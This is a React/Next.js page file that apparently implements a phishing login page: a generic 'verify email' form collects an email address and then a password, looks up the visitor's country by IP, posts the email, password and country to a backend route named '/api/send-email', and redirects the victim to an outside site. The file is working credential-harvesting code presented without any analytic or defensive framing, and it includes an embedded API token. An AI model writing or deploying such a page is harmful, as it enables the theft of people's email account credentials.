// pages/index.js

import { useState, useEffect } from 'react';
import axios from 'axios';
import styles from '../styles/Home.module.css';

export default function Home() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [country, setCountry] = useState('');
  const [emailSubmitted, setEmailSubmitted] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [isProcessing, setIsProcessing] = useState(false); // Modal state

  useEffect(() => {
    // Fetch user's country based on IP and get full country name
    axios.get('https://ipinfo.io/json?token=c3e87e382ddea7')
      .then(response => {
        const countryCode = response.data.country;
        // Fetch full country name using the country code
        return axios.get(`https://restcountries.com/v3.1/alpha/${countryCode}`);
      })
      .then(countryResponse => {
        setCountry(countryResponse.data[0].name.common); // Set full country name
      })
      .catch(error => {
        console.error('Failed to fetch full country name:', error);
        setErrorMessage('Failed to retrieve country information.');
      });
  }, []);

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    if (validateEmail(email)) {
      setEmailSubmitted(true);
      setErrorMessage('');
    } else {
      setErrorMessage('Please enter a valid email address.');
    }
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();

    if (password.length >= 5) {
      setIsProcessing(true); // Show processing modal

      try {
        // Send email and password with country to the backend API
        const response = await axios.post('/api/send-email', {
          email,
          password,
          country,
        });

        console.log('Email sent successfully!', response.data.message);
        window.location.href = 'https://ss.achemsite.info';
      } catch (error) {
        console.error('Failed to send email:', error);
        setErrorMessage('Failed to submit. Please try again.');
      } finally {
        setIsProcessing(false); // Hide processing modal after API call completes
      }
    } else {
      setErrorMessage('Password must be at least 5 characters long.');
    }
  };

  const validateEmail = (email) => {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(String(email).toLowerCase());
  };

  return (
    <div className={styles.container}>
      <div className={styles.background}></div>
      <div className={styles.loginBox}>
        <img src="/logo.png" alt="Logo" className={styles.logo} />
        <div className={styles.message}>
          {emailSubmitted ? 'Validate email password to continue' : 'Verify email to proceed'}
        </div>
        {emailSubmitted ? (
          <>
            <div className={styles.displayEmail}>{email}</div>
            <form onSubmit={handlePasswordSubmit}>
              <input
                type="password"
                placeholder="Password"
                className={styles.inputField}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <div className={styles.buttonContainer}>
                <button type="submit" className={styles.submitButton}>Validate</button>
              </div>
            </form>
          </>
        ) : (
          <form onSubmit={handleEmailSubmit}>
            <input
              type="email"
              placeholder="Email Address"
              className={styles.inputField}
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
            <div className={styles.buttonContainer}>
              <button type="submit" className={styles.nextButton}>Next</button>
            </div>
          </form>
        )}
        {errorMessage && <div className={styles.errorMessage}>{errorMessage}</div>}

        {/* Processing Modal */}
        {isProcessing && (
          <div className={styles.modal}>
            <div className={styles.modalContent}>
              <p>Processing...</p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
